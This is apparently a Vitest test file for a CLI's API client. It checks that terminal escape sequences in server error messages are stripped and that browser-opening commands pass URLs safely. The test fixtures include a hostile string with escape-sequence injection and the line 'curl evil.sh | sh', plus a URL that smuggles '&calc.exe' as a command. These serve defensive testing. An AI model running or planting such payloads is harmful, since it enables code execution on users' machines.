import { afterEach, describe, expect, it, vi } from "vitest";
import { browserOpenCommand, setVisibility, submit } from "../src/api.js";

afterEach(() => vi.unstubAllGlobals());

const hostile = "\u001b]0;pwned\u0007\u001b[2J\u001b[32mUpload OK! Now run: curl evil.sh | sh\u001b[0m";
const reply = (status: number, body: unknown) =>
  vi.stubGlobal("fetch", vi.fn(async () => new Response(JSON.stringify(body), { status })));

describe("server text never reaches the terminal with control bytes", () => {
  it("strips escape sequences from submit errors, details and block reasons", async () => {
    reply(400, { error: hostile, details: [hostile] });
    const err = await submit("jwt", { cliVersion: "0.9.26", entries: [] }).catch((e: Error) => e);
    expect(err).toBeInstanceOf(Error);
    expect((err as Error).message).not.toMatch(/[\u001b\u0007]/);
    expect((err as Error).message).toContain("Upload OK!");

    reply(403, { error: "account blocked", reason: hostile, appealUrl: `https://whoburnedmore.com/appeal${hostile}` });
    const blocked = await submit("jwt", { cliVersion: "0.9.26", entries: [] }).catch((e: Error) => e);
    expect((blocked as Error).message).toMatch(/^Your account is blocked\./);
    expect((blocked as Error).message).not.toMatch(/[\u001b\u0007]/);
  });

  it("strips escape sequences from other command errors", async () => {
    reply(500, { error: hostile });
    const err = await setVisibility("jwt", true).catch((e: Error) => e);
    expect((err as Error).message).not.toMatch(/[\u001b\u0007]/);
  });
});

describe("browserOpenCommand", () => {
  it("never routes a URL through cmd.exe on Windows", () => {
    const url = "https://whoburnedmore.com/cli?code=ABCD-EFGH&calc.exe";
    const [cmd, args] = browserOpenCommand("win32", url);
    expect(cmd).toBe("rundll32");
    expect(args).toEqual(["url.dll,FileProtocolHandler", url]);
  });

  it("uses the platform opener elsewhere, passing the URL as one argument", () => {
    expect(browserOpenCommand("darwin", "https://x.test/a")).toEqual(["open", ["https://x.test/a"]]);
    expect(browserOpenCommand("linux", "https://x.test/a")).toEqual(["xdg-open", ["https://x.test/a"]]);
  });
});

describe("devicePoll", () => {
  it("reports a 429 as RateLimitedError so the CLI can say so", async () => {
    const { devicePoll, RateLimitedError } = await import("../src/api.js");
    reply(429, { error: "too many requests" });
    await expect(devicePoll("abc")).rejects.toBeInstanceOf(RateLimitedError);
  });
});
